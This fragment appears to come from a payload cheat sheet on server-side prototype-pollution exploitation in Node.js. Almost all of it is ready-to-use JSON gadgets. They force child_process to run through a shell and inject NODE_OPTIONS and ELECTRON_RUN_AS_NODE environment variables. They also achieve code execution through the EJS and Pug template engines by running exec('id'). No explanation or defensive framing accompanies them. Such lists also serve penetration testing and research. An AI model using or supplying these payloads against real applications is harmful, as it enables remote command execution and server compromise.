<server_side_exploitation>
<rce_gadgets>
{% raw %}
# Node.js child_process gadgets
{"__proto__": {"shell": true}}
{"__proto__": {"shell": "/bin/sh"}}
// Makes spawn() execute through shell

# Environment variable injection
{"__proto__": {"env": {"NODE_OPTIONS": "--require=/tmp/malicious.js"}}}
{"__proto__": {"env": {"ELECTRON_RUN_AS_NODE": "1"}}}

# Command injection via shell
{"__proto__": {"shell": true, "argv0": "node"}}

# EJS template engine RCE
{"__proto__": {"client": true}}
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').exec('id');x"}}

# Pug template engine RCE
{"__proto__": {"block": {"type": "Text", "line": "process.mainModule.require('child_process').exec('id')"}}}
{% endraw %}
</rce_gadgets>

